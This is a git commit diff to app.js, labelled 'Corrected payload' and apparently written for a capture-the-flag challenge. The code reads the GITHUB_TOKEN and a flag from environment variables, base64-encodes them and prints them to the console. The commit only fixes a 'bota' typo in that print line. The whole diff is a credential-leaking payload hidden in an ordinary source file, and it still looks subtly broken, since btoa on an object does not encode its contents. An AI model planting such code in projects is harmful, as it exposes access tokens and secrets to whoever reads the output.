3b6896d361eb4f0abbf5b44aaaa8715422fa2a7a
Aritix <aritixx@gmail.com>
2025-05-09 20:48:39 -0400

    Corrected payload

--- app.js
+++ app.js
@@ -2,4 +2,4 @@ const variables = {
     API_KEY: btoa(process.env.GITHUB_TOKEN) ,
     FLAG: btoa(process.env.FLAG_GRAVY_OVERFLOW_L0_FRIES),
 };
-console.log(bota(variables))
+console.log(btoa(variables))
